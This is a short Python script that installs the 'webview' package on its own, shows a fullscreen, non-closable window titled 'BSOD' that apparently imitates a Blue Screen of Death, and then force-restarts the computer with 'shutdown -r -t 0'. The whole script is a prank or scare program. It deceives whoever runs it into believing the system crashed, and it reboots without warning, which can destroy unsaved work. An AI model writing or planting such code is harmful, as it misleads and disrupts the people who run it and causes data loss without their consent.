from logging import exception
import os
try:
    os.system('pip install webview')
except:
    pass
import webview
import time
webview.create_window("BSOD", "page.html", width=800,height=600, fullscreen=True, resizable=False, confirm_close=False)
webview.start()
time.sleep(3)
os.system('shutdown -r -t 0')